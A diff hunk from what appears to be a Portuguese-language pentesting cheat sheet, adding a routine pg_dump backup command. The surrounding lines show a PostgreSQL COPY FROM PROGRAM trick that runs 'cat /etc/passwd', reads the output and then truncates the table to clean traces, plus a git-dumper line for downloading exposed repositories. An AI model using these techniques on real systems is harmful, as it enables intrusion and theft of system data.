@@ -7383,6 +7383,7 @@ Tags: `#comandos-avulsos` `#misc` `Coammandos aleatorios`
 	COPY public.cmd_output FROM PROGRAM 'cat /etc/passwd';
 	SELECT * FROM public.cmd_output;
 	TRUNCATE TABLE public.cmd_output; CLEAN COMMANDS FROM TABLE
+	pg_dump -U usuario -h localhost -d nome_da_base -F p -f dump_da_base.sql
 
 
 	git-dumper | echo "BAIXA O GIT EXPOSTO"
